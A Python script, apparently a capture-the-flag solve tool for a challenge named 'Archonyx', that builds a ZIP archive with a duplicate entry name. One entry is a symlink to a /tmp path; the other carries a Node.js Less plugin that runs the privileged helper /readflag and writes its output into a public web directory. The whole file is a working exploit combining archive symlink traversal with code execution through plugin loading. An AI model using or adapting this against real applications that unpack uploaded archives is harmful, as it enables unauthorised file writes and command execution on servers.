#!/usr/bin/env python3
"""Build the duplicate-entry Less plugin archive used in Archonyx."""

from __future__ import annotations

import argparse
import json
import stat
import zipfile
from pathlib import Path


DEFAULT_OUTPUT = Path("seal_sorcery.zip")
DEFAULT_TARGET = "/tmp/seal_plugin.js"
DEFAULT_PROOF_PATH = "/app/public/clearance-proof.txt"
DEFAULT_HELPER = "/readflag"


def build_archive(
    output: Path,
    target: str,
    helper: str,
    proof_path: str,
) -> None:
    plugin = f"""
const fs = require('fs');
const cp = require('child_process');

module.exports = {{
  install() {{
    const flag = cp.execFileSync(
      {json.dumps(helper)},
      {{ encoding: 'utf8' }}
    );
    fs.writeFileSync(
      {json.dumps(proof_path)},
      flag
    );
  }}
}};
""".lstrip()

    with zipfile.ZipFile(output, "w") as archive:
        link = zipfile.ZipInfo("seal_plugin.js")
        link.create_system = 3
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        link.compress_type = zipfile.ZIP_STORED
        archive.writestr(link, target)

        replacement = zipfile.ZipInfo("seal_plugin.js")
        replacement.create_system = 3
        replacement.external_attr = (stat.S_IFREG | 0o600) << 16
        replacement.compress_type = zipfile.ZIP_STORED
        archive.writestr(replacement, plugin)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Create the duplicate-entry ZIP used to place the Archonyx Less plugin."
        )
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=DEFAULT_OUTPUT,
        help=f"Output archive path. Default: {DEFAULT_OUTPUT}",
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Symlink target. Default: {DEFAULT_TARGET}",
    )
    parser.add_argument(
        "--helper",
        default=DEFAULT_HELPER,
        help=f"Privileged helper path. Default: {DEFAULT_HELPER}",
    )
    parser.add_argument(
        "--proof-path",
        default=DEFAULT_PROOF_PATH,
        help=f"Proof output path. Default: {DEFAULT_PROOF_PATH}",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    build_archive(
        args.output,
        args.target,
        args.helper,
        args.proof_path,
    )
    print(f"created={args.output}")


if __name__ == "__main__":
    main()
